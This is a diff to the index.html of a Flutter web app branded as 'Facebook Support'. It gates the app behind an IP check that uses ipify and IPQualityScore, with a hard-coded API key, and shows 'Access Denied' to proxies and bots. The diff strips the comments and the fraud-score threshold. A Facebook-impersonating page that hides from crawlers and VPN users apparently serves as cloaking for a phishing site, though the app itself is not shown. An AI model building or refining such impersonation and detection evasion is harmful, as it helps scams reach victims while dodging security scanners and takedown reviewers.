@@ -2,114 +2,68 @@
 <html>
 <head>
   <base href="/">
-
   <meta charset="UTF-8">
   <meta content="IE=Edge" http-equiv="X-UA-Compatible">
   <meta name="description" content="">
-
-  <!-- iOS meta tags & icons -->
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="black">
   <meta name="apple-mobile-web-app-title" content="facebook">
   <link rel="apple-touch-icon" href="icons/Icon-192.png">
-
-  <!-- Favicon -->
   <link rel="icon" type="image/png" href="favicon.png"/>
-
   <title>Facebook Support</title>
   <link rel="manifest" href="manifest.json">
-
-  <script>
-    // The value below is injected by flutter build, do not touch.
-    const serviceWorkerVersion = "2655113037";
-  </script>
-
-  <!-- This script adds the flutter initialization JS code -->
+  <script>const serviceWorkerVersion = "2655113037";</script>
   <script src="flutter.js" defer></script>
 </head>
 <body>
-
 <script>
-  /**************************************************
-   * 1) Define an async function to load Flutter.
-   **************************************************/
   async function loadFlutterApp() {
-    // Download main.dart.js and initialize the Flutter app
     const appRunner = await _flutter.loader.loadEntrypoint({
-      serviceWorker: {
-        serviceWorkerVersion: serviceWorkerVersion
-      }
+      serviceWorker: { serviceWorkerVersion: serviceWorkerVersion }
     });
     await appRunner.initializeEngine();
     appRunner.runApp();
   }
 
-  /**************************************************************
-   * 2) Define an IP check function using IPify & IPQualityScore.
-   **************************************************************/
   async function checkIPWithIPQS() {
-    // Replace with your own IPQualityScore API key
     const IPQS_API_KEY = 'EXAXJnKFgenQIOVmr8wEZykbhI0cvLyF';
-
     try {
-      // 2.1) Get user IP from ipify
       const ipifyRes = await fetch('https://api.ipify.org?format=json');
       const ipifyData = await ipifyRes.json();
       const userIp = ipifyData.ip;
-
-      // 2.2) Construct IPQualityScore URL
-      // "strictness" can be 0 (least aggressive) to 3 (most aggressive).
-      // Higher levels detect more VPNs/proxies but may cause false positives.
       const ipqsUrl = `https://ipqualityscore.com/api/json/ip/${IPQS_API_KEY}/${userIp}?strictness=1`;
-
-      // 2.3) Call IPQualityScore
       const ipqsRes = await fetch(ipqsUrl);
       const ipqsData = await ipqsRes.json();
-
       if (!ipqsData.success) {
-        // If API call fails, decide if you want to block or allow.
-        // Here we block by default:
         return { allowed: false, reason: 'IPQS API call failed' };
       }
-
-      const { proxy, bot_status, fraud_score } = ipqsData;
-      // Example logic:
-      // Block if IP is flagged as proxy, or as a bot, or if fraud_score > 70
-      if (proxy === true || bot_status === true || fraud_score > 50) {
+      const { proxy, bot_status } = ipqsData;
+      if (proxy === true || bot_status === true) {
         return {
           allowed: false,
-          reason: `Blocked by IPQS. Proxy: ${proxy}, Bot: ${bot_status}, Fraud Score: ${fraud_score}`
+          reason: `Blocked by IPQS. Proxy: ${proxy}, Bot: ${bot_status}`
         };
       } else {
         return { allowed: true };
       }
-
     } catch (err) {
       console.error('Error checking IP with IPQS:', err);
-      // If something goes wrong, you might choose to block or allow.
-      // We'll block to be safe.
       return { allowed: false, reason: 'Exception occurred' };
     }
   }
 
-  /************************************************************
-   * 3) On window load, run the IP check, then load or block.
-   ************************************************************/
   window.addEventListener('load', async function() {
     const result = await checkIPWithIPQS();
     if (!result.allowed) {
-      // 3.1) Block user
       document.body.innerHTML = `
         <h1>Access Denied</h1>
-        <p>Your connection is flagged as proxy/VPN or suspicious.</p>
+        <p>Your connection is flagged as a proxy or bot.</p>
         <p>Reason: ${result.reason || 'Unknown'}</p>
       `;
     } else {
-      // 3.2) Allowed, so load the Flutter app
       loadFlutterApp();
     }
   });
 </script>
-
 </body>
 </html>
